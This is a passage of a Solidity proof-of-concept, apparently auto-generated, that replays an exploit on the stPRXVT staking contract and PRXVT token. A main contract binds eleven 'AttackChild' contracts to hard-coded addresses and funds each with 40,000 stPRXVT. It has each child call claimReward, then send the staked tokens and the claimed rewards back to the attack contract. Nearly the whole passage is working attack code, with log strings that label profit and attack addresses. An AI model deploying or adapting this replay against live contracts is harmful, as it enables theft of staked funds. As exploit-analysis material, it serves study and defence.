                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    function _deployAttackChild2() internal {
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(4));
            observedSalt;
            address created = address(attackChild_3);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_3)))._prepareAttackChild4();
        {
            uint256 transferActionGraphAmount_5 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_3), transferActionGraphAmount_5);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild_3)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(5));
            observedSalt;
            address created = address(attackChild_6);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_6)))._prepareAttackChild7();
        {
            uint256 transferActionGraphAmount_6 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_6), transferActionGraphAmount_6);
        }
    }

    function _replayProtocolCal2() internal {
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild_6)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(6));
            observedSalt;
            address created = address(attackChild_1);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_1)))._prepareAttackChild2();
        {
            uint256 transferActionGraphAmount_7 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_1), transferActionGraphAmount_7);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    function _replayProtocolCal3() internal {
        AttackChild(payable(address(attackChild_1)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(7));
            observedSalt;
            address created = address(attackChild_10);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_10)))._prepareAttackChil2();
        {
            uint256 transferActionGraphAmount_8 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_10), transferActionGraphAmount_8);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild_10)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    function _deployAttackChildCo() internal {
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(8));
            observedSalt;
            address created = address(attackChild_2);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_2)))._prepareAttackChild3();
        {
            uint256 transferActionGraphAmount_9 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_2), transferActionGraphAmount_9);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild_2)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(9));
            observedSalt;
            address created = address(attackChild_4);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_4)))._prepareAttackChild5();
        {
            uint256 transferActionGraphAmount_10 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_4), transferActionGraphAmount_10);
        }
    }

    function _replayProtocolCal4() internal {
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild_4)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(10));
            observedSalt;
            address created = address(attackChild_7);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_7)))._prepareAttackChild8();
        {
            uint256 transferActionGraphAmount_11 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_7), transferActionGraphAmount_11);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    function _replayProtocolCal5() internal {
        AttackChild(payable(address(attackChild_7)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xe6d7db7e) {
            _deployAttackChild3();
            bytes memory ret = abi.encode(0x00000000000000000000006aBB9B69Dc32927680, uint256(11));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242));
        attackChild_1 = AttackChild(payable(0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6));
        attackChild_2 = AttackChild(payable(0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e));
        attackChild_3 = AttackChild(payable(0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368));
        attackChild_4 = AttackChild(payable(0x72CDfF23dB035D4959901158d230c0c8642a38a8));
        attackChild_5 = AttackChild(payable(0x8D7bf27794B53129a143b120B1852Fe3048E8466));
        attackChild_6 = AttackChild(payable(0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d));
        attackChild_7 = AttackChild(payable(0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349));
        attackChild_8 = AttackChild(payable(0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb));
        attackChild_9 = AttackChild(payable(0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E));
        attackChild_10 = AttackChild(payable(0xEA6E0B9f162E5532389f32832529a794bf10F4AD));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    function _boundAttack(bytes memory data) internal {
        _decodedCall(address(attackChild), data);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "attack child dispatch failed");
    }

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }
}

contract AttackChild {
    receive() external payable {}

    function execute(address arg0, address arg1, address arg2) external payable {
        arg0;
        arg1;
        arg2;
        if (address(this) == 0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E) {
            _handleAttackChildCa();
            return;
        }
        if (address(this) == 0x8D7bf27794B53129a143b120B1852Fe3048E8466) {
            _handleAttackChild7();
            return;
        }
        if (address(this) == 0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb) {
            _handleAttackChild10();
            return;
        }
        if (address(this) == 0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242) {
            _handleAttackChild11();
            return;
        }
        if (address(this) == 0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368) {
            _handleAttackChild5();
            return;
        }
        if (address(this) == 0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d) {
            _handleAttackChild8();
            return;
        }
        if (address(this) == 0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6) {
            _handleAttackChild3();
            return;
        }
        if (address(this) == 0xEA6E0B9f162E5532389f32832529a794bf10F4AD) {
            _handleAttackChild2();
            return;
        }
        if (address(this) == 0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e) {
            _handleAttackChild4();
            return;
        }
        if (address(this) == 0x72CDfF23dB035D4959901158d230c0c8642a38a8) {
            _handleAttackChild6();
            return;
        }
        if (address(this) == 0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349) {
            _handleAttackChild9();
            return;
        }
        _handleAttackChildCa();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        _entryCb();
    }

    function attackChildCb10() external payable {
        _handleAttackChildCa();
        return;
    }

    function attackChildCb6() external payable {
        _handleAttackChild7();
        return;
    }

    function attackChildCb9() external payable {
        _handleAttackChild10();
        return;
    }

    function attackChildCb() external payable {
        _handleAttackChild11();
        return;
    }

    function attackChildCb4() external payable {
        _handleAttackChild5();
        return;
    }

    function attackChildCb7() external payable {
        _handleAttackChild8();
        return;
    }

    function attackChildCb2() external payable {
        _handleAttackChild3();
        return;
    }

    function attackChildCb11() external payable {
        _handleAttackChild2();
        return;
    }

    function attackChildCb3() external payable {
        _handleAttackChild4();
        return;
    }

    function attackChildCb5() external payable {
        _handleAttackChild6();
        return;
    }

    function attackChildCb8() external payable {
        _handleAttackChild9();
        return;
    }

    function _entryCb() internal {}

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }

    function _handleAttackChild11() internal {
        _readPoolState();
    }

    function _readPoolState() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild() public {}

    function _handleAttackChild3() internal {
        _readPoolState2();
    }

    function _readPoolState2() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild2() public {}

    function _handleAttackChild4() internal {
        _readPoolState3();
    }

    function _readPoolState3() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild3() public {}

    function _handleAttackChild5() internal {
        _readPoolState4();
    }

    function _readPoolState4() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild4() public {}

    function _handleAttackChild6() internal {
        _readPoolState5();
    }

    function _readPoolState5() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild5() public {}

    function _handleAttackChild7() internal {
        _readPoolState6();
    }

    function _readPoolState6() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild6() public {}

    function _handleAttackChild8() internal {
        _readPoolState7();
    }

    function _readPoolState7() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild7() public {}

    function _handleAttackChild9() internal {
        _readPoolState8();
    }

    function _readPoolState8() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild8() public {}

    function _handleAttackChild10() internal {
        _readPoolState9();
    }

    function _readPoolState9() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
